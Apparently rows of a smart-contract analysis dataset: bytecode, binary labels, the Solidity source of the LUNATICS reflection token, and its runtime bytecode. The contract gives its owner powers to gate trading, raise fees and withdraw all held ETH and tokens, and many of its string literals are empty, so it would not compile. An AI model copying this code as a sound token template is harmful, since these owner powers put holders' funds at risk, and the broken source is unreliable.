103600083015261389c81613860565b9050919050565b7f544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000600082015250565b60006138d9601c83612e20565b91506138e4826138a3565b602082019050919050565b60006020820190508181036000830152613908816138cc565b9050919050565b7f544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c69737460008201527f6564210000000000000000000000000000000000000000000000000000000000602082015250565b600061396b602383612e20565b91506139768261390f565b604082019050919050565b6000602082019050818103600083015261399a8161395e565b9050919050565b60006139ac82612ebf565b91506139b783612ebf565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156139ec576139eb613373565b5b828201905092915050565b7f544f4b454e3a2042616c616e636520657863656564732077616c6c657420736960008201527f7a65210000000000000000000000000000000000000000000000000000000000602082015250565b6000613a53602383612e20565b9150613a5e826139f7565b604082019050919050565b60006020820190508181036000830152613a8281613a46565b9050919050565b6000613a9482612ebf565b9150613a9f83612ebf565b925082821015613ab257613ab1613373565b5b828203905092915050565b7f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260008201527f65666c656374696f6e7300000000000000000000000000000000000000000000602082015250565b6000613b19602a83612e20565b9150613b2482613abd565b604082019050919050565b60006020820190508181036000830152613b4881613b0c565b9050919050565b600081519050613b5e81612d09565b92915050565b600060208284031215613b7a57613b79612c0b565b5b6000613b8884828501613b4f565b91505092915050565b6000819050919050565b6000613bb6613bb1613bac84613b91565b612f6b565b612ebf565b9050919050565b613bc681613b9b565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613c0181612cf7565b82525050565b6000613c138383613bf8565b60208301905092915050565b6000602082019050919050565b6000613c3782613bcc565b613c418185613bd7565b9350613c4c83613be8565b8060005b83811015613c7d578151613c648882613c07565b9750613c6f83613c1f565b925050600181019050613c50565b5085935050505092915050565b600060a082019050613c9f6000830188612fe5565b613cac6020830187613bbd565b8181036040830152613cbe8186613c2c565b9050613ccd6060830185613099565b613cda6080830184612fe5565b9695505050505050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b6000613d1a601b83612e20565b9150613d2582613ce4565b602082019050919050565b60006020820190508181036000830152613d4981613d0d565b9050919050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000613dac602183612e20565b9150613db782613d50565b604082019050919050565b60006020820190508181036000830152613ddb81613d9f565b905091905056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212208b8c8184d5ef99b70259289251cd9ef5a5fcb2b6b11fe7d948f288639966a50664736f6c63430008090033,0,0,0,0,0,0,0,1,0,1,1,0,1,1,0,0,0
"pragma solidity 0.8.15;library SafeMath { function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { uint256 c = a + b; if (c < a) return (false, 0); return (true, c); } } function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b > a) return (false, 0); return (true, a - b); } } function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (a == 0) return (true, 0); uint256 c = a * b; if (c / a != b) return (false, 0); return (true, c); } } function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b == 0) return (false, 0); return (true, a / b); } } function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) { unchecked { if (b == 0) return (false, 0); return (true, a % b); } } function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return a % b; } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b <= a, errorMessage); return a - b; } } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b > 0, errorMessage); return a / b; } } function mod( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { unchecked { require(b > 0, errorMessage); return a % b; } }}interface IERC20 { function totalSupply() external view returns (uint256); function decimals() external view returns (uint8); function symbol() external view returns (string memory); function name() external view returns (string memory); function getOwner() external view returns (address); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address _owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}abstract contract Auth { address internal owner; mapping(address => bool) internal authorizations; constructor(address _owner) { owner = _owner; authorizations[_owner] = true; } modifier onlyOwner() { require(isOwner(msg.sender), ); _; } modifier authorized() { require(isAuthorized(msg.sender), ); _; } function authorize(address adr) public onlyOwner { authorizations[adr] = true; } function unauthorize(address adr) public onlyOwner { authorizations[adr] = false; } function isOwner(address account) public view returns (bool) { return account == owner; } function isAuthorized(address adr) public view returns (bool) { return authorizations[adr]; } function transferOwnership(address payable adr) public onlyOwner { owner = adr; authorizations[adr] = true; emit OwnershipTransferred(adr); } event OwnershipTransferred(address owner);}interface IDEXFactory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IDEXRouter { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB, uint256 liquidity ); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity ); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;}interface IDividendDistributor { function setDistributionCriteria( uint256 _minPeriod, uint256 _minDistribution ) external; function setShare(address shareholder, uint256 amount) external; function deposit() external payable; function process(uint256 gas) external;}contract DividendDistributor is IDividendDistributor { using SafeMath for uint256; address _token; struct Share { uint256 amount; uint256 totalExcluded; uint256 totalRealised; } IERC20 REWARD_TOKEN = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; IDEXRouter router; address[] shareholders; mapping(address => uint256) shareholderIndexes; mapping(address => uint256) shareholderClaims; mapping(address => Share) public shares; uint256 public totalShares; uint256 public totalDividends; uint256 public totalDistributed; uint256 public dividendsPerShare; uint256 public dividendsPerShareAccuracyFactor = 10**36; uint256 public minPeriod = 1 hours; uint256 public minDistribution = 100000; uint256 currentIndex; bool initialized; modifier initialization() { require(!initialized); _; initialized = true; } modifier onlyToken() { require(msg.sender == _token); _; } constructor(address _router) { router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); _token = msg.sender; } function setRewardToken(address _rewardToken) external onlyToken { REWARD_TOKEN = IERC20(_rewardToken); } function setDistributionCriteria( uint256 _minPeriod, uint256 _minDistribution ) external override onlyToken { minPeriod = _minPeriod; minDistribution = _minDistribution; } function setShare(address shareholder, uint256 amount) external override onlyToken { if (shares[shareholder].amount > 0) { distributeDividend(shareholder); } if (amount > 0 && shares[shareholder].amount == 0) { addShareholder(shareholder); } else if (amount == 0 && shares[shareholder].amount > 0) { removeShareholder(shareholder); } totalShares = totalShares.sub(shares[shareholder].amount).add(amount); shares[shareholder].amount = amount; shares[shareholder].totalExcluded = getCumulativeDividends( shares[shareholder].amount ); } function deposit() external payable override onlyToken { uint256 balanceBefore = REWARD_TOKEN.balanceOf(address(this)); address[] memory path = new address[](2); path[0] = WETH; path[1] = address(REWARD_TOKEN); router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: msg.value }(0, path, address(this), block.timestamp); uint256 amount = REWARD_TOKEN.balanceOf(address(this)).sub( balanceBefore ); totalDividends = totalDividends.add(amount); dividendsPerShare = dividendsPerShare.add( dividendsPerShareAccuracyFactor.mul(amount).div(totalShares) ); } function process(uint256 gas) external override onlyToken { uint256 shareholderCount = shareholders.length; if (shareholderCount == 0) { return; } uint256 gasUsed = 0; uint256 gasLeft = gasleft(); uint256 iterations = 0; while (gasUsed < gas && iterations < shareholderCount) { if (currentIndex >= shareholderCount) { currentIndex = 0; } if (shouldDistribute(shareholders[currentIndex])) { distributeDividend(shareholders[currentIndex]); } gasUsed = gasUsed.add(gasLeft.sub(gasleft())); gasLeft = gasleft(); currentIndex++; iterations++; } } function shouldDistribute(address shareholder) internal view returns (bool) { return shareholderClaims[shareholder] + minPeriod < block.timestamp && getUnpaidEarnings(shareholder) > minDistribution; } function distributeDividend(address shareholder) internal { if (shares[shareholder].amount == 0) { return; } uint256 amount = getUnpaidEarnings(shareholder); if (amount > 0) { totalDistributed = totalDistributed.add(amount); REWARD_TOKEN.transfer(shareholder, amount); shareholderClaims[shareholder] = block.timestamp; shares[shareholder].totalRealised = shares[shareholder] .totalRealised .add(amount); shares[shareholder].totalExcluded = getCumulativeDividends( shares[shareholder].amount ); } } function claimDividend() external { distributeDividend(msg.sender); } function getUnpaidEarnings(address shareholder) public view returns (uint256) { if (shares[shareholder].amount == 0) { return 0; } uint256 shareholderTotalDividends = getCumulativeDividends( shares[shareholder].amount ); uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded; if (shareholderTotalDividends <= shareholderTotalExcluded) { return 0; } return shareholderTotalDividends.sub(shareholderTotalExcluded); } function getCumulativeDividends(uint256 share) internal view returns (uint256) { return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor); } function addShareholder(address shareholder) internal { shareholderIndexes[shareholder] = shareholders.length; shareholders.push(shareholder); } function removeShareholder(address shareholder) internal { shareholders[shareholderIndexes[shareholder]] = shareholders[ shareholders.length - 1 ]; shareholderIndexes[ shareholders[shareholders.length - 1] ] = shareholderIndexes[shareholder]; shareholders.pop(); }}contract LUNATICS is IERC20, Auth { using SafeMath for uint256; uint256 public constant MASK = type(uint128).max; address REWARD_TOKEN = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; address constant DEAD = 0x000000000000000000000000000000000000dEaD; address constant ZERO = 0x0000000000000000000000000000000000000000; string constant _name = ; string constant _symbol = ; uint8 constant _decimals = 9; uint256 _totalSupply = 1_00_000_000_000 * (10**_decimals); mapping(address => uint256) _balances; mapping(address => mapping(address => uint256)) _allowances; mapping(address => bool) public isFeeExempt; mapping(address => bool) public isDividendExempt; uint256 liquidityFee = 100; uint256 reflectionFee = 300; uint256 marketingFee = 300; uint256 burnFee = 100; uint256 totalFee = 800; uint256 feeDenominator = 10000; address public marketingFeeReceiver; IDEXRouter public router; address public pair; bool public tradingEnabled = false; DividendDistributor distributor; address public distributorAddress; uint256 distributorGas = 500000; bool public swapEnabled = true; uint256 public swapThreshold = _totalSupply / 2000; bool inSwap; modifier swapping() { inSwap = true; _; inSwap = false; } constructor() Auth(msg.sender) { router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); pair = IDEXFactory(router.factory()).createPair(WETH, address(this)); _allowances[address(this)][address(router)] = _totalSupply; WETH = router.WETH(); distributor = new DividendDistributor( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); distributorAddress = address(distributor); isFeeExempt[msg.sender] = true; isFeeExempt[address(this)] = true; isFeeExempt[DEAD] = true; isFeeExempt[ZERO] = true; isDividendExempt[pair] = true; isDividendExempt[address(this)] = true; isDividendExempt[DEAD] = true; isFeeExempt[ZERO] = true; marketingFeeReceiver = 0x5bc9cF0933adFeFC9F5ea55E294c4Cd580b97Dfd; approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, _totalSupply); approve(address(pair), _totalSupply); _balances[msg.sender] = _totalSupply; emit Transfer(address(0), msg.sender, _totalSupply); } receive() external payable {} function totalSupply() external view override returns (uint256) { return _totalSupply; } function decimals() external pure override returns (uint8) { return _decimals; } function symbol() external pure override returns (string memory) { return _symbol; } function name() external pure override returns (string memory) { return _name; } function getOwner() external view override returns (address) { return owner; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _allowances[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } function approveMax(address spender) external returns (bool) { return approve(spender, _totalSupply); } function transfer(address recipient, uint256 amount) external override returns (bool) { return _transferFrom(msg.sender, recipient, amount); } function transferFrom( address sender, address recipient, uint256 amount ) external override returns (bool) { if (_allowances[sender][msg.sender] != _totalSupply) { _allowances[sender][msg.sender] = _allowances[sender][msg.sender] .sub(amount, ); } return _transferFrom(sender, recipient, amount); } function _transferFrom( address sender, address recipient, uint256 amount ) internal returns (bool) { if (!isOwner(sender)) { require(tradingEnabled, ); } if (inSwap) { return _basicTransfer(sender, recipient, amount); } if(sender != pair && recipient != pair) { return _basicTransfer(sender, recipient, amount); } if (shouldSwapBack()) { swapBack(); } _balances[sender] = _balances[sender].sub( amount, ); uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount; _balances[recipient] = _balances[recipient].add(amountReceived); if (!isDividendExempt[sender]) { try distributor.setShare(sender, _balances[sender]) {} catch {} } if (!isDividendExempt[recipient]) { try distributor.setShare(recipient, _balances[recipient]) {} catch {} } try distributor.process(distributorGas) {} catch {} emit Transfer(sender, recipient, amountReceived); return true; } function _basicTransfer( address sender, address recipient, uint256 amount ) internal returns (bool) { _balances[sender] = _balances[sender].sub( amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); return true; } function shouldTakeFee(address sender, address recipient) internal view returns (bool) { if(isFeeExempt[sender] || isFeeExempt[recipient]){return false;} else{return true;} } function takeFee(address sender, uint256 amount) internal returns (uint256) { uint256 feeAmount = amount.mul(totalFee - burnFee).div(feeDenominator); uint256 burnFeeAmount = amount.mul(burnFee).div(feeDenominator); _balances[address(this)] = _balances[address(this)].add(feeAmount); emit Transfer(sender, address(this), feeAmount); _balances[DEAD] = _balances[DEAD].add(burnFeeAmount); emit Transfer(sender, DEAD, burnFeeAmount); return amount.sub(feeAmount + burnFeeAmount); } function setIsFeeExempt(address wallet, bool value) public authorized { isFeeExempt[wallet] = value; } function shouldSwapBack() internal view returns (bool) { return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold; } function swapBack() internal swapping { uint256 amountToLiquify = swapThreshold .mul(liquidityFee) .div(totalFee) .div(2); uint256 amountToSwap = swapThreshold.sub(amountToLiquify); address[] memory path = new address[](2); path[0] = address(this); path[1] = WETH; uint256 balanceBefore = address(this).balance; router.swapExactTokensForETHSupportingFeeOnTransferTokens( amountToSwap, 0, path, address(this), block.timestamp ); uint256 amountETH = address(this).balance.sub(balanceBefore); uint256 totalETHFee = totalFee.sub(liquidityFee.div(2)); uint256 amountETHLiquidity = amountETH .mul(liquidityFee) .div(totalETHFee) .div(2); uint256 amountETHReflection = amountETH.mul(reflectionFee).div( totalETHFee ); uint256 amountETHMarketing = amountETH.mul(marketingFee).div( totalETHFee ); try distributor.deposit{value: amountETHReflection}() {} catch {} payable(marketingFeeReceiver).transfer(amountETHMarketing); if (amountToLiquify > 0) { router.addLiquidityETH{value: amountETHLiquidity}( address(this), amountToLiquify, 0, 0, owner, block.timestamp ); emit AutoLiquify(amountETHLiquidity, amountToLiquify); } } function enableTrading() external onlyOwner { tradingEnabled = true; } function setIsDividendExempt(address holder, bool exempt) public authorized { require(holder != address(this) && holder != pair); isDividendExempt[holder] = exempt; if (exempt) { distributor.setShare(holder, 0); } else { distributor.setShare(holder, _balances[holder]); } } function setAreDividendAndFeeExempt(address[] calldata wallets, bool exempt) external authorized { for (uint256 i = 0; i < wallets.length; i++) { setIsDividendExempt(wallets[i], exempt); setIsFeeExempt(wallets[i], exempt); } } function setFees( uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _burnFee ) external authorized { liquidityFee = _liquidityFee; reflectionFee = _reflectionFee; marketingFee = _marketingFee; burnFee = _burnFee; totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee).add( burnFee ); require(totalFee <= 2500, ); } function setFeeReceivers(address _marketingFeeReceiver) external authorized { marketingFeeReceiver = _marketingFeeReceiver; } function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized { swapEnabled = _enabled; swapThreshold = _amount; } function setRewardToken(address newToken) external authorized { require(newToken != address(0), ); distributor.setRewardToken(newToken); REWARD_TOKEN = newToken; } function setDistributionCriteria( uint256 _minPeriod, uint256 _minDistribution ) external authorized { distributor.setDistributionCriteria(_minPeriod, _minDistribution); } function setDistributorSettings(uint256 gas) external authorized { require(gas < 750000, ); distributorGas = gas; } function clearStuckBalance() external authorized { uint256 amountETH = address(this).balance; payable(msg.sender).transfer(amountETH); } function clearStuckTokens(address _tokenContract) public authorized { require( _tokenContract != address(this), ); IERC20 tokenContract = IERC20(_tokenContract); tokenContract.transfer( msg.sender, tokenContract.balanceOf(address(this)) ); } function Airdrop(address[] memory addresses, uint256[] memory amounts) external authorized { require( addresses.length == amounts.length, ); for (uint256 i = 0; i < addresses.length; i++) { _basicTransfer(msg.sender, addresses[i], amounts[i]); } } event AutoLiquify(uint256 amountETH, uint256 amount);}",0x60806040526004361061023f5760003560e01c80638a8c523c1161012e578063dd62ed3e116100ab578063f0b37c041161006f578063f0b37c0414610745578063f2fde38b14610765578063f708a64f14610785578063f887ea40146107a5578063fe9fbb80146107c557600080fd5b8063dd62ed3e1461067b578063df20fd49146106c1578063e01bb688146106e1578063e91f214e14610701578063e96fada21461072557600080fd5b8063a8aa1b31116100f2578063a8aa1b31146105db578063a9059cbb146105fb578063ad5c46481461061b578063b6a5d7de1461063b578063c558ae6b1461065b57600080fd5b80638a8c523c146105385780638aee81271461054d57806395d89b411461056d5780639d1944f51461059b578063a51af4c5146105bb57600080fd5b80633f4218e0116101bc57806365d43ac71161018057806365d43ac7146104765780636ddd1713146104965780636fcba377146104b057806370a08231146104d0578063893d20e81461050657600080fd5b80633f4218e0146103b55780634355855a146103e55780634ada218b14610415578063571ac8b014610436578063658d4b7f1461045657600080fd5b80632d48e896116102035780632d48e896146103135780632f54bf6e14610335578063313ce56714610364578063346cc7be14610380578063364333f4146103a057600080fd5b80630445b6671461024b57806306fdde0314610274578063095ea7b3146102ae57806318160ddd146102de57806323b872dd146102f357600080fd5b3661024657005b600080fd5b34801561025757600080fd5b5061026160165481565b6040519081526020015b60405180910390f35b34801561028057600080fd5b506040805180820190915260088152674c756e617469637360c01b60208201525b60405161026b9190611c7f565b3480156102ba57600080fd5b506102ce6102c9366004611cec565b6107e5565b604051901515815260200161026b565b3480156102ea57600080fd5b50600454610261565b3480156102ff57600080fd5b506102ce61030e366004611d18565b610852565b34801561031f57600080fd5b5061033361032e366004611d59565b610916565b005b34801561034157600080fd5b506102ce610350366004611d7b565b6000546001600160a01b0391821691161490565b34801561037057600080fd5b506040516009815260200161026b565b34801561038c57600080fd5b5061033361039b366004611d7b565b6109ae565b3480156103ac57600080fd5b50610333610b13565b3480156103c157600080fd5b506102ce6103d0366004611d7b565b60076020526000908152604090205460ff1681565b3480156103f157600080fd5b506102ce610400366004611d7b565b60086020526000908152604090205460ff1681565b34801561042157600080fd5b506011546102ce90600160a01b900460ff1681565b34801561044257600080fd5b506102ce610451366004611d7b565b610b6b565b34801561046257600080fd5b50610333610471366004611da6565b610b79565b34801561048257600080fd5b50610333610491366004611ddf565b610bc9565b3480156104a257600080fd5b506015546102ce9060ff1681565b3480156104bc57600080fd5b506103336104cb366004611e65565b610c71565b3480156104dc57600080fd5b506102616104eb366004611d7b565b6001600160a01b031660009081526005602052604090205490565b34801561051257600080fd5b506000546001600160a01b03165b6040516001600160a01b03909116815260200161026b565b34801561054457600080fd5b50610333610d16565b34801561055957600080fd5b50610333610568366004611d7b565b610d55565b34801561057957600080fd5b50604080518082019091526005815264131d5b985560da1b60208201526102a1565b3480156105a757600080fd5b506103336105b6366004611e97565b610e44565b3480156105c757600080fd5b50601354610520906001600160a01b031681565b3480156105e757600080fd5b50601154610520906001600160a01b031681565b34801561060757600080fd5b506102ce610616366004611cec565b610ec0565b34801561062757600080fd5b50600354610520906001600160a01b031681565b34801561064757600080fd5b50610333610656366004611d7b565b610ecd565b34801561066757600080fd5b50610333610676366004611f86565b610f1e565b34801561068757600080fd5b50610261610696366004612048565b6001600160a01b03918216600090815260066020908152604080832093909416825291909152205490565b3480156106cd57600080fd5b506103336106dc366004612076565b611007565b3480156106ed57600080fd5b506103336106fc366004611d7b565b611043565b34801561070d57600080fd5b506102616fffffffffffffffffffffffffffffffff81565b34801561073157600080fd5b50600f54610520906001600160a01b031681565b34801561075157600080fd5b50610333610760366004611d7b565b61108a565b34801561077157600080fd5b50610333610780366004611d7b565b6110d5565b34801561079157600080fd5b506103336107a0366004611da6565b61116b565b3480156107b157600080fd5b50601054610520906001600160a01b031681565b3480156107d157600080fd5b506102ce6107e0366004611d7b565b61126f565b3360008181526006602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906108409086815260200190565b60405180910390a35060015b92915050565b6004546001600160a01b0384166000908152600660209081526040808320338452909152812054909114610901576040805180820182526016815275496e73756666696369656e7420416c6c6f77616e636560501b6020808301919091526001600160a01b03871660009081526006825283812033825290915291909120546108dc91849061128d565b6001600160a01b03851660009081526006602090815260408083203384529091529020555b61090c8484846112b9565b90505b9392505050565b61091f3361126f565b6109445760405162461bcd60e51b815260040161093b90612094565b60405180910390fd5b6012546040516316a4744b60e11b815260048101849052602481018390526001600160a01b0390911690632d48e896906044015b600060405180830381600087803b15801561099257600080fd5b505af11580156109a6573d6000803e3d6000fd5b505050505050565b6109b73361126f565b6109d35760405162461bcd60e51b815260040161093b90612094565b306001600160a01b03821603610a2b5760405162461bcd60e51b815260206004820152601c60248201527f43616e6e6f74207769746864726177206e617469766520746f6b656e00000000604482015260640161093b565b6040516370a0823160e01b815230600482015281906001600160a01b0382169063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610a7b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a9f91906120bc565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610aea573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b0e91906120d5565b505050565b610b1c3361126f565b610b385760405162461bcd60e51b815260040161093b90612094565b6040514790339082156108fc029083906000818181858888f19350505050158015610b67573d6000803e3d6000fd5b5050565b600061084c826004546107e5565b610b823361126f565b610b9e5760405162461bcd60e51b815260040161093b90612094565b6001600160a01b03919091166000908152600760205260409020805460ff1916911515919091179055565b610bd23361126f565b610bee5760405162461bcd60e51b815260040161093b90612094565b60005b82811015610c6b57610c29848483818110610c0e57610c0e6120f2565b9050602002016020810190610c239190611d7b565b8361116b565b610c59848483818110610c3e57610c3e6120f2565b9050602002016020810190610c539190611d7b565b83610b79565b80610c638161211e565b915050610bf1565b50505050565b610c7a3361126f565b610c965760405162461bcd60e51b815260040161093b90612094565b6009849055600a839055600b829055600c819055610cc081610cba8481888861161d565b9061161d565b600d8190556109c41015610c6b5760405162461bcd60e51b815260206004820152601a60248201527f46656573206d757374206265206c657373207468616e20323525000000000000604482015260640161093b565b6000546001600160a01b03163314610d405760405162461bcd60e51b815260040161093b90612137565b6011805460ff60a01b1916600160a01b179055565b610d5e3361126f565b610d7a5760405162461bcd60e51b815260040161093b90612094565b6001600160a01b038116610dc25760405162461bcd60e51b815260206004820152600f60248201526e496e76616c6964206164647265737360881b604482015260640161093b565b601254604051638aee812760e01b81526001600160a01b03838116600483015290911690638aee812790602401600060405180830381600087803b158015610e0957600080fd5b505af1158015610e1d573d6000803e3d6000fd5b5050600280546001600160a01b0319166001600160a01b0394909416939093179092555050565b610e4d3361126f565b610e695760405162461bcd60e51b815260040161093b90612094565b620b71b08110610ebb5760405162461bcd60e51b815260206004820152601860248201527f496e617070726f7072696174652067617320616d6f756e740000000000000000604482015260640161093b565b601455565b600061090f3384846112b9565b6000546001600160a01b03163314610ef75760405162461bcd60e51b815260040161093b90612137565b6001600160a01b03166000908152600160208190526040909120805460ff19169091179055565b610f273361126f565b610f435760405162461bcd60e51b815260040161093b90612094565b8051825114610fab5760405162461bcd60e51b815260206004820152602e60248201527f41697264726f703a2061646472657373657320616e6420616d6f756e7473206c60448201526d0cadccee8d040dad2e6dac2e8c6d60931b606482015260840161093b565b60005b8251811015610b0e57610ff433848381518110610fcd57610fcd6120f2565b6020026020010151848481518110610fe757610fe76120f2565b6020026020010151611629565b5080610fff8161211e565b915050610fae565b6110103361126f565b61102c5760405162461bcd60e51b815260040161093b90612094565b6015805460ff191692151592909217909155601655565b61104c3361126f565b6110685760405162461bcd60e51b815260040161093b90612094565b600f80546001600160a01b0319166001600160a01b0392909216919091179055565b6000546001600160a01b031633146110b45760405162461bcd60e51b815260040161093b90612137565b6001600160a01b03166000908152600160205260409020805460ff19169055565b6000546001600160a01b031633146110ff5760405162461bcd60e51b815260040161093b90612137565b600080546001600160a01b0319166001600160a01b038316908117825580825260016020818152604093849020805460ff191690921790915591519081527f04dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc686163910160405180910390a150565b6111743361126f565b6111905760405162461bcd60e51b815260040161093b90612094565b6001600160a01b03821630148015906111b757506011546001600160a01b03838116911614155b6111c057600080fd5b6001600160a01b0382166000908152600860205260409020805460ff1916821580159190911790915561122657601254604051630a5b654b60e11b81526001600160a01b03848116600483015260006024830152909116906314b6ca9690604401610978565b6012546001600160a01b0383811660008181526005602052604090819020549051630a5b654b60e11b8152600481019290925260248201529116906314b6ca9690604401610978565b6001600160a01b031660009081526001602052604090205460ff1690565b600081848411156112b15760405162461bcd60e51b815260040161093b9190611c7f565b505050900390565b600080546001600160a01b0385811691161461131e57601154600160a01b900460ff1661131e5760405162461bcd60e51b8152602060048201526013602482015272151c98591a5b99c81a5cc8191a5cd8589b1959606a1b604482015260640161093b565b60175460ff161561133b57611334848484611629565b905061090f565b6011546001600160a01b0385811691161480159061136757506011546001600160a01b03848116911614155b1561137757611334848484611629565b61137f6116fd565b1561138c5761138c61174e565b6040805180820182526014815273496e73756666696369656e742042616c616e636560601b6020808301919091526001600160a01b0387166000908152600590915291909120546113de91849061128d565b6001600160a01b0385166000908152600560205260408120919091556114048585611aa8565b61140e5782611418565b6114188584611afc565b6001600160a01b03851660009081526005602052604090205490915061143e908261161d565b6001600160a01b0380861660009081526005602090815260408083209490945591881681526008909152205460ff166114e2576012546001600160a01b0386811660008181526005602052604090819020549051630a5b654b60e11b8152600481019290925260248201529116906314b6ca9690604401600060405180830381600087803b1580156114cf57600080fd5b505af19250505080156114e0575060015b505b6001600160a01b03841660009081526008602052604090205460ff16611573576012546001600160a01b0385811660008181526005602052604090819020549051630a5b654b60e11b8152600481019290925260248201529116906314b6ca9690604401600060405180830381600087803b15801561156057600080fd5b505af1925050508015611571575060015b505b6012546014546040516001624d3b8760e01b031981526001600160a01b039092169163ffb2c479916115ab9160040190815260200190565b600060405180830381600087803b1580156115c557600080fd5b505af19250505080156115d6575060015b50836001600160a01b0316856001600160a01b031660008051602061226a8339815191528360405161160a91815260200190565b60405180910390a3506001949350505050565b600061090f828461215a565b6040805180820182526014815273496e73756666696369656e742042616c616e636560601b6020808301919091526001600160a01b038616600090815260059091529182205461167a91849061128d565b6001600160a01b0380861660009081526005602052604080822093909355908516815220546116a9908361161d565b6001600160a01b03808516600081815260056020526040908190209390935591519086169060008051602061226a833981519152906116eb9086815260200190565b60405180910390a35060019392505050565b6011546000906001600160a01b0316331480159061171e575060175460ff16155b801561172c575060155460ff165b801561174957506016543060009081526005602052604090205410155b905090565b6017805460ff19166001179055600d546009546016546000926117819260029261177b9291839190611c5b565b90611c67565b9050600061179a82601654611c7390919063ffffffff16565b604080516002808252606082018352929350600092909160208301908036833701905050905030816000815181106117d4576117d46120f2565b6001600160a01b039283166020918202929092010152600354825191169082906001908110611805576118056120f2565b6001600160a01b03928316602091820292909201015260105460405163791ac94760e01b81524792919091169063791ac9479061184f908690600090879030904290600401612172565b600060405180830381600087803b15801561186957600080fd5b505af115801561187d573d6000803e3d6000fd5b5050505060006118968247611c7390919063ffffffff16565b905060006118bc6118b36002600954611c6790919063ffffffff16565b600d5490611c73565b905060006118de600261177b8461177b60095488611c5b90919063ffffffff16565b905060006118fb8361177b600a5487611c5b90919063ffffffff16565b905060006119188461177b600b5488611c5b90919063ffffffff16565b9050601260009054906101000a90046001600160a01b03166001600160a01b031663d0e30db0836040518263ffffffff1660e01b81526004016000604051808303818588803b15801561196a57600080fd5b505af19350505050801561197c575060015b50600f546040516001600160a01b039091169082156108fc029083906000818181858888f193505050501580156119b7573d6000803e3d6000fd5b508815611a93576010546000805460405163f305d71960e01b8152306004820152602481018d90526044810183905260648101929092526001600160a01b0390811660848301524260a48301529091169063f305d71990859060c40160606040518083038185885af1158015611a31573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190611a5691906121e3565b505060408051858152602081018c90527f424db2872186fa7e7afa7a5e902ed3b49a2ef19c2f5431e672462495dd6b450692500160405180910390a15b50506017805460ff191690